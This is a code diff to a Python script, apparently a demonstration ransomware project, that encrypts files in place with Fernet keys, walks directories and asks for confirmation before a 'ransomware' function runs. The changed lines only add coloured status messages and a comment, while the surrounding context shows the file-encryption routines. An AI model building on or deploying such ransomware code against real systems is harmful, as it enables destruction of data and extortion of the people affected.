@@ -66,6 +66,8 @@ def connect_to_server(host='127.0.0.1', port=12345, message="Hello!"):
 # Generates encryption key in file <filename>
 def generate_key():
 
+    print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Generating the encryption key...")
+
     key = Fernet.generate_key()
     
     # Write the key to a file
@@ -104,9 +106,9 @@ def decrypt(input_file):
         write_file(input_file, decrypted_data)
         
     except InvalidToken:
-        print("Invalid token! Decryption failed.")
+        print(f"[{bcolors.FAIL}x{bcolors.ENDC}] Invalid token! Decryption failed.")
     except Exception as e:
-        print(f"An error occurred: {e}")
+        print(f"[{bcolors.FAIL}x{bcolors.ENDC}] An error occurred: {e}")
 
 #===========================#
 
@@ -119,7 +121,7 @@ def encrypt(input_file):
         write_file(input_file, encrypted_data)
         
     except Exception as e:
-        print(f"An error occurred: {e}")
+        print(f"[{bcolors.FAIL}x{bcolors.ENDC}] An error occurred: {e}")
 
 #===========================#
 
@@ -133,6 +135,7 @@ def walk_files(directory):
 
 def ransomware(dirsToEncrypt):
 
+    # Make absolutely sure we didn't call this function by accident.
     areYouSure = input(f"[{bcolors.FAIL}x{bcolors.ENDC}] WARNING: YOU ARE ABOUT TO EXECUTE RANSOMWARE ON YOUR SYSTEM. ARE YOU SURE YOU HAVE BACKUPS AND WISH TO PROCEED? (y/N) ")
     if areYouSure == "y" or areYouSure == "Y" or areYouSure == "yes":
 
